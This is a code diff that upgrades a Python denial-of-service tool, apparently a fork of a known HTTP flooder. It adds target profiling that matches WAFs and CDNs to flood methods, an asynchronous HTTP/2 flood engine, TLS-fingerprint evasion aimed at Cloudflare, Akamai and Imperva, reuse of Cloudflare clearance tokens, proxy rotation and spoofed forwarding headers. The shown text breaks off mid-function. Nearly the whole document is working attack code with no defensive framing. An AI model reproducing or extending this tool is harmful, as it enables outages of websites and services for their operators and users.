@@ -1,5 +1,21 @@
 #!/usr/bin/env python3
- 
+
+import sys
+import os
+import subprocess
+
+# [PRE-FLIGHT CHECK]
+try:
+    import httpx
+    import cloudscraper
+    import PyRoxy
+except ImportError:
+    print('Missing dependencies. Redirecting to auto-installer...')
+    subprocess.check_call([sys.executable, 'install.py'])
+    sys.exit(1)
+
+import asyncio
+import platform
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from itertools import cycle
@@ -27,16 +43,29 @@ from typing import Any, List, Set, Tuple
 from urllib import parse
 from uuid import UUID, uuid4
 
-# [OPTIMIZED] Ulimit (File Descriptor) Booster
+# [OPTIMIZED] Ulimit (File Descriptor) Booster for Linux/Kali
 try:
     import resource
     soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
-    if soft < 65535:
-        # Try to set to Hard Limit or 65535
-        target = min(hard, 65535)
-        resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
+    # Try escalating progressively: 1M -> 500K -> 100K -> hard limit
+    for target_fd in [1000000, 500000, 100000, hard]:
+        try:
+            resource.setrlimit(resource.RLIMIT_NOFILE, (target_fd, target_fd))
+            break
+        except (ValueError, OSError):
+            continue
 except ImportError:
-    pass # Windows/Non-Unix doesn't support resource module
+    pass  # Windows doesn't have resource module
+
+# [OPTIMIZED] uvloop — C-based event loop for Linux (2-4x faster than default)
+try:
+    import uvloop
+    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
+    uvloop_status = True
+except ImportError:
+    uvloop_status = False
+
+
 
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
@@ -44,11 +73,23 @@ from certifi import where
 from cloudscraper import create_scraper
 from dns import resolver
 from icmplib import ping
-from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
+try:
+    from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
+    HAS_IMPACKET = True
+except ImportError:
+    HAS_IMPACKET = False
+    
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 from base64 import b64encode
+
+# [V6] Optional TLS Fingerprint Evasion
+try:
+    import tls_client
+    HAS_TLS_CLIENT = True
+except ImportError:
+    HAS_TLS_CLIENT = False
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -74,9 +115,11 @@ ctx.set_ciphers(
     "DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384"
 )
 
-__version__: str = "2.4 SNAPSHOT"
+__version__: str = "6.0 VAN HELSING"
 __dir__: Path = Path(__file__).parent
 __ip__: Any = None
+IS_WINDOWS = platform.system() == "Windows"
+IS_LINUX = platform.system() == "Linux"
 tor2webs = [
             'onion.city',
             'onion.cab',
@@ -122,6 +165,12 @@ with socket(AF_INET, SOCK_DGRAM) as s:
     s.connect(("8.8.8.8", 80))
     __ip__ = s.getsockname()[0]
 
+# [V8] Global CF Clearance Token from turnstile_dispenser
+GLOBAL_CF_CLEARANCE = None
+cf_path = __dir__ / "files" / "cf_clearance.txt"
+if cf_path.exists():
+    GLOBAL_CF_CLEARANCE = cf_path.read_text().strip()
+
 
 class bcolors:
     HEADER = '\033[95m'
@@ -146,7 +195,8 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "SLOW_V2", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP", "WP_SEARCH", "XMLRPC_AMP", "POST_DYN", "H2_FLOOD"
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP",
+        "WP_SEARCH", "XMLRPC_AMP", "POST_DYN", "H2_FLOOD", "CHAOS"
     }
 
     LAYER4_AMP: Set[str] = {
@@ -257,10 +307,13 @@ REQUESTS_SENT = Counter()
 BYTES_SEND = Counter()
 TOTAL_REQUESTS_SENT = Counter()
 CONNECTIONS_SENT = Counter()
+ERROR_COUNT = Counter()  # [V6] Structured Error Tracking
+LAST_ERROR = ""  # [V6] Last error message for display
 BURNED_PROXIES = {} # [PHASE 11] Temporal Blacklist: Proxy -> BurnTimestamp
 COOLING_PERIOD = 300 # [PHASE 11] 5 Minutes cooldown for blocked proxies
 RECYCLE_EVENT = Event()
 IS_RECYCLING = False
+PROXY_ALIVE_COUNT = Counter()  # [V6] Live proxy counter for health display
 
 
 class Tools:
@@ -443,6 +496,213 @@ class Tools:
     def safe_close(sock=None):
         if sock:
             sock.close()
+
+    @staticmethod
+    def track_error(e: Exception):
+        """[V6] Structured error tracking instead of silent pass"""
+        global ERROR_COUNT, LAST_ERROR
+        ERROR_COUNT += 1
+        LAST_ERROR = str(e)[:80]
+
+
+# [V8] Target Profiler — Auto-detect WAF/CDN/Server stack and suggest best methods
+class TargetProfiler:
+    """Probes target and returns a profile dict with server, waf, and recommended methods."""
+    
+    CDN_HEADERS = {
+        'cf-ray': 'Cloudflare', 'cf-cache-status': 'Cloudflare',
+        'x-cdn': 'CDN', 'x-cache': 'CDN/Varnish',
+        'x-akamai-transformed': 'Akamai', 'x-sucuri-id': 'Sucuri',
+        'x-powered-by-plesk': 'Plesk', 'server-timing': 'CDN',
+    }
+    
+    WAF_SIGNATURES = {
+        'cloudflare': 'Cloudflare',
+        'ddos-guard': 'DDoS-Guard',
+        'sucuri': 'Sucuri',
+        'akamai': 'Akamai',
+        'incapsula': 'Imperva/Incapsula',
+        'stackpath': 'StackPath',
+        'aws': 'AWS WAF/CloudFront',
+        'fastly': 'Fastly',
+    }
+    
+    METHOD_MAP = {
+        'Cloudflare':           ['CFB', 'CFBUAM', 'H2_FLOOD', 'SLOW_V2', 'BYPASS'],
+        'DDoS-Guard':           ['DGB', 'H2_FLOOD', 'SLOW_V2', 'POST_DYN'],
+        'Akamai':               ['H2_FLOOD', 'SLOW_V2', 'POST_DYN', 'STRESS'],
+        'Imperva/Incapsula':    ['H2_FLOOD', 'BYPASS', 'SLOW_V2', 'POST_DYN'],
+        'AWS WAF/CloudFront':   ['H2_FLOOD', 'POST_DYN', 'STRESS', 'XMLRPC_AMP'],
+        'Sucuri':               ['BYPASS', 'H2_FLOOD', 'POST_DYN'],
+        'nginx':                ['SLOW_V2', 'STRESS', 'POST_DYN', 'GET', 'XMLRPC_AMP'],
+        'apache':               ['APACHE', 'SLOW', 'SLOW_V2', 'XMLRPC_AMP', 'STRESS'],
+        'iis':                  ['STRESS', 'GET', 'POST_DYN', 'H2_FLOOD'],
+        'litespeed':            ['POST_DYN', 'STRESS', 'XMLRPC_AMP', 'H2_FLOOD'],
+        'unknown':              ['GET', 'STRESS', 'POST_DYN', 'H2_FLOOD'],
+    }
+    
+    @staticmethod
+    def profile(url_str: str) -> dict:
+        """Probe target and return profile with server, waf, recommendations."""
+        result = {'server': 'unknown', 'waf': None, 'cms': None, 'methods': [], 'headers': {}}
+        
+        try:
+            resp = get(url_str, timeout=8, verify=False, allow_redirects=True,
+                       headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+            headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
+            result['headers'] = dict(resp.headers)
+            body = resp.text[:5000].lower()
+            
+            # Detect Server
+            server = headers.get('server', '')
+            if 'nginx' in server: result['server'] = 'nginx'
+            elif 'apache' in server: result['server'] = 'apache'
+            elif 'litespeed' in server: result['server'] = 'litespeed'
+            elif 'microsoft-iis' in server: result['server'] = 'iis'
+            elif 'cloudflare' in server: result['server'] = 'cloudflare'
+            
+            # Detect WAF/CDN
+            for hdr, waf_name in TargetProfiler.CDN_HEADERS.items():
+                if hdr in headers:
+                    result['waf'] = waf_name
+                    break
+            
+            if not result['waf']:
+                for sig, waf_name in TargetProfiler.WAF_SIGNATURES.items():
+                    if sig in server or sig in str(headers) or sig in body:
+                        result['waf'] = waf_name
+                        break
+            
+            # Detect CMS
+            if 'wp-content' in body or 'wordpress' in body:
+                result['cms'] = 'WordPress'
+            elif 'joomla' in body:
+                result['cms'] = 'Joomla'
+            elif 'drupal' in body:
+                result['cms'] = 'Drupal'
+            
+            # Build recommendations
+            key = result['waf'] or result['server'] or 'unknown'
+            result['methods'] = TargetProfiler.METHOD_MAP.get(key, TargetProfiler.METHOD_MAP['unknown'])
+            
+            # CMS-specific additions
+            if result['cms'] == 'WordPress':
+                if 'XMLRPC_AMP' not in result['methods']:
+                    result['methods'].insert(0, 'XMLRPC_AMP')
+                if 'WP_SEARCH' not in result['methods']:
+                    result['methods'].insert(1, 'WP_SEARCH')
+                    
+        except Exception as e:
+            result['methods'] = TargetProfiler.METHOD_MAP['unknown']
+        
+        return result
+
+
+# [V6] Proxy Health Checker — Background thread that periodically validates proxies
+class ProxyHealthChecker(Thread):
+    def __init__(self, proxies_list: list, interval: int = 60, timeout: float = 3.0):
+        Thread.__init__(self, daemon=True)
+        self._proxies = proxies_list
+        self._interval = interval
+        self._timeout = timeout
+
+    def run(self):
+        global PROXY_ALIVE_COUNT
+        while True:
+            sleep(self._interval)
+            if not self._proxies:
+                continue
+            
+            # Sample check: test 10% of proxies (min 5, max 50)
+            sample_size = max(5, min(50, len(self._proxies) // 10))
+            sample = [randchoice(self._proxies) for _ in range(sample_size)]
+            alive = 0
+            
+            for p in sample:
+                try:
+                    s = socket(AF_INET, SOCK_STREAM)
+                    s.settimeout(self._timeout)
+                    p_str = str(p)
+                    if ":" in p_str:
+                        parts = p_str.replace("//", "").split(":")
+                        host = parts[-2].split("@")[-1]
+                        port = int(parts[-1])
+                        s.connect((host, port))
+                        alive += 1
+                    s.close()
+                except Exception:
+                    pass
+            
+            # Extrapolate from sample
+            if sample_size > 0:
+                alive_ratio = alive / sample_size
+                estimated_alive = int(alive_ratio * len(self._proxies))
+                PROXY_ALIVE_COUNT.set(estimated_alive)
+                
+                if alive_ratio < 0.1:
+                    logger.warning(f"{bcolors.FAIL}[HEALTH] Proxy pool critical! Only ~{estimated_alive} alive. Triggering recycle...{bcolors.RESET}")
+                    RECYCLE_EVENT.set()
+
+
+# [V6] Stealth Client — TLS fingerprint evasion using tls_client library
+class StealthClient:
+    """Wrapper that uses tls_client for Chrome-identical JA3 fingerprint"""
+    
+    @staticmethod
+    def create_session(proxy_url: str = None):
+        if HAS_TLS_CLIENT:
+            session = tls_client.Session(
+                client_identifier="chrome_120",
+                random_tls_extension_order=True
+            )
+            if proxy_url:
+                session.proxies = {
+                    "http": proxy_url,
+                    "https": proxy_url
+                }
+            return session
+        else:
+            # Fallback to requests Session
+            s = Session()
+            if proxy_url:
+                s.proxies = {"http": proxy_url, "https": proxy_url}
+            s.verify = False
+            return s
+
+    @staticmethod
+    def stealth_get(url: str, proxy_url: str = None, timeout: int = 5):
+        """Single stealth GET request with Chrome JA3 fingerprint"""
+        global REQUESTS_SENT, BYTES_SEND
+        session = StealthClient.create_session(proxy_url)
+        try:
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                "Sec-Ch-Ua-Mobile": "?0",
+                "Sec-Ch-Ua-Platform": '"Windows"',
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "none",
+                "Sec-Fetch-User": "?1",
+                "Priority": "u=0, i",
+                "Upgrade-Insecure-Requests": "1",
+            }
+            if HAS_TLS_CLIENT:
+                resp = session.get(url, headers=headers, timeout_seconds=timeout)
+            else:
+                resp = session.get(url, headers=headers, timeout=timeout, verify=False)
+            REQUESTS_SENT += 1
+            BYTES_SEND += len(url) + 500  # Approximate
+            return resp
+        except Exception as e:
+            Tools.track_error(e)
+            return None
+        finally:
+            if not HAS_TLS_CLIENT and hasattr(session, 'close'):
+                session.close()
 
 
 class Minecraft:
@@ -868,6 +1128,169 @@ class Layer4(Thread):
                 self._amp_payloads = cycle(self._generate_amp())
 
 
+# [V6] Async HTTP/2 Flood Engine — Bypasses GIL with true async I/O
+class AsyncHttpFlood(Thread):
+    """Each thread runs its own asyncio event loop with httpx.AsyncClient
+    for genuine HTTP/2 multiplexing (hundreds of concurrent streams per connection)"""
+    
+    def __init__(self, thread_id: int, target: URL, host: str, 
+                 rpc: int = 50, synevent: Event = None,
+                 useragents: list = None, referers: list = None,
+                 proxies: list = None, crawled_paths: list = None, method: str = "GET"):
+        Thread.__init__(self, daemon=True)
+        self._thread_id = thread_id
+        self._target = target
+        self._host = host
+        self._rpc = rpc
+        self._synevent = synevent
+        self._proxies = proxies
+        self.crawled_paths = crawled_paths or []
+        self._method = method if method in ["GET", "POST"] else "GET"
+        self.host_array = []
+        
+        self._cf_clearance = None
+        cf_path = Path(__dir__ / "files/cf_clearance.txt")
+        if cf_path.exists():
+            self._cf_clearance = cf_path.read_text().strip()
+            
+
+        self._useragents = list(useragents) if useragents else [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
+        ]
+        self._referers = list(referers) if referers else [
+            'https://www.google.com/', 'https://www.bing.com/', 
+            'https://www.facebook.com/', 'https://duckduckgo.com/'
+        ]
+    
+    def _get_random_path(self) -> str:
+        if self.crawled_paths and randint(0, 100) < 60:
+            return randchoice(self.crawled_paths)
+        heavy = ["/", "/?s=" + ProxyTools.Random.rand_str(5),
+                 "/search/" + ProxyTools.Random.rand_str(8)]
+        return randchoice(heavy)
+    
+    def _get_proxy_url(self) -> str:
+        if not self._proxies:
+            return None
+        for _ in range(20):
+            p = randchoice(self._proxies)
+            p_str = str(p)
+            burn_time = BURNED_PROXIES.get(p_str)
+            if not burn_time or (time() - burn_time >= COOLING_PERIOD):
+                if "://" in p_str:
+                    return p_str
+                return f"http://{p_str}"
+        return None
+    
+    def _generate_post_payload(self) -> str:
+        # [WAF BYPASS] Intelligent payload generator to evade WAF static analysis
+        # Many WAFs block static {"data": "xxxxx"} patterns
+        r_type = randint(1, 4)
+        if r_type == 1:
+            return '{"search": "%s", "limit": %d}' % (ProxyTools.Random.rand_str(16), randint(10, 100))
+        elif r_type == 2:
+            return '{"user_id": "%s", "action": "ping"}' % uuid4()
+        elif r_type == 3:
+            return '{"payload": "%s", "timestamp": %d}' % (ProxyTools.Random.rand_str(32), int(time()))
+        else:
+            return '{"data": "%s"}' % ProxyTools.Random.rand_str(32)
+
+    async def _flood_batch(self, client: httpx.AsyncClient, batch_size: int = 50):
+        """Fire batch_size requests concurrently via HTTP/2 multiplexing"""
+        global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT, ERROR_COUNT
+        
+        target_domain = self._target.user or self._target.host
+        
+        async def single_request():
+            global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT
+            path = self._get_random_path()
+            safe_path = path if path.startswith("/") else f"/{path}"
+            url = f"{self._target.scheme}://{self._target.host}{safe_path}"
+            ua = randchoice(self._useragents)
+            
+            headers = {
+                "User-Agent": ua,
+                "Accept-Encoding": "gzip, deflate, br",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "X-Forwarded-For": Tools.get_random_indo_ip(),
+                "Referer": randchoice(self._referers),
+                "Host": target_domain,
+                "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                "Sec-Ch-Ua-Mobile": "?0",
+                "Sec-Ch-Ua-Platform": '"Windows"',
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Priority": "u=0, i",
+            }
+            if hasattr(self, '_cf_clearance') and self._cf_clearance:
+                headers["Cookie"] = f"cf_clearance={self._cf_clearance}"
+            
+            try:
+                target_ip = randchoice(self.host_array) if hasattr(self, 'host_array') and self.host_array else self._target.host
+                url = f"{self._target.scheme}://{target_ip}{safe_path}"
+                
+                if self._method == "POST":
+                    headers["Content-Type"] = "application/json"
+                    headers["X-Requested-With"] = "XMLHttpRequest"
+                    resp = await client.post(url, headers=headers, content=self._generate_post_payload())
+                else:
+                    resp = await client.get(url, headers=headers)
+                    
+                REQUESTS_SENT += 1
+                CONNECTIONS_SENT += 1
+                BYTES_SEND += 1000
+                
+                if resp.status_code in {403, 429}:
+                    BURNED_PROXIES[str(self._proxies)] = time() if self._proxies else None
+                elif resp.status_code >= 500:
+                    pass  # Target overloaded — good
+            except Exception as e:
+                Tools.track_error(e)
+        
+        tasks = [single_request() for _ in range(batch_size)]
+        await asyncio.gather(*tasks, return_exceptions=True)
+    
+    async def _run_async(self):
+        """Main async loop: create client, fire batches until event clears"""
+        global REQUESTS_SENT, ERROR_COUNT
+        
+        while self._synevent.is_set():
+            proxy_url = self._get_proxy_url()
+            try:
+                async with httpx.AsyncClient(
+                    http2=True,
+                    verify=False,
+                    proxy=proxy_url,
+                    timeout=httpx.Timeout(5.0, connect=3.0),
+                    limits=httpx.Limits(max_connections=100, max_keepalive_connections=50)
+                ) as client:
+                    # Fire multiple batches per client connection
+                    # [FIX] Pipeline: fire multiple batches concurrently for max throughput
+                    while self._synevent.is_set():
+                        batch_tasks = [self._flood_batch(client, batch_size=50) for _ in range(min(self._rpc, 10))]
+                        await asyncio.gather(*batch_tasks, return_exceptions=True)
+            except Exception as e:
+                Tools.track_error(e)
+                await asyncio.sleep(0.5)
+    
+    def run(self):
+        if self._synevent:
+            self._synevent.wait()
+        
+        # Each thread gets its own event loop for true async I/O
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        try:
+            loop.run_until_complete(self._run_async())
+        except Exception as e:
+            Tools.track_error(e)
+        finally:
+            loop.close()
+
+
 # noinspection PyBroadException,PyUnusedLocal
 class HttpFlood(Thread):
     _proxies: List[Proxy] = None
@@ -898,13 +1321,9 @@ class HttpFlood(Thread):
         self._synevent = synevent
         self._rpc = rpc
         self._method = method
-        self._method = method
         self._target = target
         self._host = host
         self._raw_target = (self._host, (self._target.port or 80))
-        
-        # [NEW] Crawler Integration placeholder
-        self.crawled_paths = []
         
         # [NEW] Crawler Integration placeholder
         # The main loop will inject crawled_paths into the class instance if found
@@ -943,6 +1362,7 @@ class HttpFlood(Thread):
             "XMLRPC_AMP": self.XMLRPC_AMP,
             "POST_DYN": self.POST_DYN,
             "H2_FLOOD": self.H2_FLOOD,
+            "CHAOS": self.CHAOS,
         }
 
         if not referers:
@@ -958,19 +1378,19 @@ class HttpFlood(Thread):
             self._proxies = proxies # [PHASE 13] Use shared reference, don't copy!
 
         if not useragents:
-            # [OPTIMIZED] Modern User-Agents (2025 Era)
+            # [V6] Modern User-Agents (Chrome 130+ Era)
             useragents: List[str] = [
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:122.0) Gecko/20100101 Firefox/122.0',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
-                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
-                'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
-                'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-                'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:130.0) Gecko/20100101 Firefox/130.0',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
+                'Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
+                'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15'
             ]
         
         self._useragents = list(useragents)
@@ -1032,7 +1452,8 @@ class HttpFlood(Thread):
             platform = "\"Linux\""
             mobile = "?0"
 
-        cookies = f"Cookie: _ga=GA1.1.{randint(1000000, 9999999)}.{randint(1000000000, 2000000000)}; cf_clearance={ProxyTools.Random.rand_str(43)}; csrftoken={ProxyTools.Random.rand_str(32)}\r\n"
+        clearance = GLOBAL_CF_CLEARANCE if GLOBAL_CF_CLEARANCE else ProxyTools.Random.rand_str(43)
+        cookies = f"Cookie: _ga=GA1.1.{randint(1000000, 9999999)}.{randint(1000000000, 2000000000)}; cf_clearance={clearance}; csrftoken={ProxyTools.Random.rand_str(32)}\r\n"
         
         headers = (
             f"X-Forwarded-For: {Tools.get_random_indo_ip()}\r\n"
@@ -1048,9 +1469,10 @@ class HttpFlood(Thread):
             f"X-Provider-Route: {ProxyTools.Random.rand_str(8)}\r\n"
             f"X-Real-ISP: {randchoice(['PT Telekomunikasi Indonesia', 'PT XL Axiata', 'PT Link Net'])}\r\n"
             f"Sec-Gpc: 1\r\n"
-            f"Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"\r\n"
+            f"Sec-Ch-Ua: \"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"\r\n"
             f"Sec-Ch-Ua-Mobile: {mobile}\r\n"
             f"Sec-Ch-Ua-Platform: {platform}\r\n"
+            f"Priority: u=0, i\r\n"
             f"Referer: {randchoice(self._referers)}\r\n"
             f"Accept-Language: en-US,en;q=0.9\r\n"
         )
@@ -1157,6 +1579,13 @@ class HttpFlood(Thread):
                 self._current_proxy = str(proxy)
         
         sock = None
+        
+        # [V7] Multi-IP Edge Array Targeting
+        target_ip = host
+        if hasattr(self, 'host_array') and self.host_array:
+            target_ip = randchoice(self.host_array)
+            self._raw_target = (target_ip, (self._target.port or 80))
+            
         try:
             if proxy:
                 sock = proxy.open_socket(AF_INET, SOCK_STREAM)
@@ -1164,9 +1593,13 @@ class HttpFlood(Thread):
                 sock = socket(AF_INET, SOCK_STREAM)
 
             sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-            sock.settimeout(5)
+            sock.settimeout(3)  # [V6] Reduced from 5s to avoid idle threads on dead proxies
             
-            sock.connect(host or self._raw_target)
+            # [FIX] Always pass tuple (ip, port) to connect()
+            connect_target = self._raw_target
+            if target_ip:
+                connect_target = (target_ip, (self._target.port or 80))
+            sock.connect(connect_target)
             
             if self._target.scheme == "https":
                 sock = ctx.wrap_socket(sock, server_hostname=self._target.host)
@@ -1177,28 +1610,6 @@ class HttpFlood(Thread):
             # if logger.level <= 10: logger.debug(f"Connection Failed: {e}")
             Tools.safe_close(sock)
             return None
-
-        sock = None
-        if proxy:
-            sock = proxy.open_socket(AF_INET, SOCK_STREAM)
-        else:
-            sock = socket(AF_INET, SOCK_STREAM)
-
-        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        
-        # [PHASE 11] Adaptive Timeout (Higher for Public Proxies)
-        # Assuming proxy_ty might be available or we just use a safer default
-        sock.settimeout(5.0) 
-        
-        sock.connect(host or self._raw_target)
-
-        if self._target.scheme.lower() == "https":
-            sock = ctx.wrap_socket(sock,
-                                   server_hostname=host[0] if host else self._target.host,
-                                   server_side=False,
-                                   do_handshake_on_connect=True,
-                                   suppress_ragged_eofs=True)
-        return sock
 
     @property
     def randHeadercontent(self) -> str:
@@ -1264,25 +1675,25 @@ class HttpFlood(Thread):
                            f"Content-Type: application/json\r\n\r\n"
                            f"{{\"data\": {ProxyTools.Random.rand_str(512)}}}")
                 
-                # [NEW] Status Tracker (Sniffer) + Blacklist
-                try:
-                    response_start = s.recv(20).decode('utf-8', errors='ignore')
-                    if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
-                        status_code = response_start.split(" ")[1]
-                        print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] STRESS: Response")
-                        if status_code in {"403", "429"}:
-                            if hasattr(self, '_current_proxy'):
-                                BURNED_PROXIES.add(self._current_proxy)
-                            raise Exception("Proxy Blocked")
-                except Exception as e:
-                    if "Blocked" in str(e): raise e
-                    pass
-                
                 if Tools.send(s, payload.encode("utf-8")):
                     REQUESTS_SENT += 1
                     BYTES_SEND += len(payload)
                     if int(REQUESTS_SENT) < 50:
                          print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] STRESS: Packet Sent to {self._target.authority}")
+                    # [FIX] Non-blocking status check AFTER send
+                    import select
+                    readable, _, _ = select.select([s], [], [], 0.01)
+                    if readable:
+                        try:
+                            response_start = s.recv(64).decode('utf-8', errors='ignore')
+                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
+                                status_code = response_start.split(" ")[1]
+                                if status_code in {"403", "429"}:
+                                    if hasattr(self, '_current_proxy'):
+                                        BURNED_PROXIES[self._current_proxy] = time()
+                                    raise Exception("Proxy Blocked")
+                        except Exception as e:
+                            if "Blocked" in str(e): raise e
         except Exception as e:
             pass
         Tools.safe_close(s)
@@ -1310,6 +1721,53 @@ class HttpFlood(Thread):
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
+
+    def STEALTH_JA3(self):
+        """[V6] Uses tls_client to emulate exact Chrome JA3 fingerprint
+        Perfect for evading Akamai, Cloudflare Bot Fight Mode, and Imperva."""
+        target_domain = self._target.user or self._target.host
+        path = self.get_random_target_path()
+        safe_path = path if path.startswith("/") else f"/{path}"
+        url = f"{self._target.scheme}://{target_domain}{safe_path}"
+
+        proxy_url = None
+        if self._proxies:
+            global BURNED_PROXIES
+            for _ in range(5):
+                p = randchoice(self._proxies)
+                p_str = str(p)
+                burn_time = BURNED_PROXIES.get(p_str)
+                if not burn_time or (time() - burn_time >= COOLING_PERIOD):
+                    proxy_url = p_str if "://" in p_str else f"http://{p_str}"
+                    self._current_proxy = p_str
+                    break
+
+        global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
+        try:
+            # StealthClient will use tls_client internally
+            session = StealthClient.create_session(proxy_url)
+            
+            headers = {
+                "User-Agent": randchoice(self._useragents),
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Connection": "keep-alive",
+            }
+            if hasattr(self, '_cf_clearance') and self._cf_clearance:
+                headers["Cookie"] = f"cf_clearance={self._cf_clearance}"
+                
+            for _ in range(self._rpc):
+                resp = session.get(url, headers=headers, timeout=5)
+                REQUESTS_SENT += 1
+                CONNECTIONS_SENT += 1
+                BYTES_SEND += 1000  # Estimate
+                
+                if resp.status_code in {403, 429}:
